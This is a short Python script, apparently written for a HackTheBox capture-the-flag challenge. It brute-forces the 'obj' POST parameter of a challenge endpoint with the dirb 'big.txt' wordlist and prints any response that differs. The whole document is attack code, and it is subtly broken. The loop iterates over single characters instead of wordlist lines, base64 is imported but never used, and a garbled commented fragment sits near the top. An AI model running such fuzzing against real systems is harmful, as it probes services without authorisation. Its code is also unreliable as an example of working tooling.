import base64
import requests
s=requests.session()
url= "http://docker.hackthebox.eu:32446/index.php"
f = open("/usr/share/dirb/wordlists/big.txt","r").read()
#F = f.sn")

for palabra in f:
    data = {"obj":palabra}
    text = s.post(url=url,data=data)
    if "Trying to get" not in text.text:
        print(text.text)
    else:
        print("data not working: " + palabra)
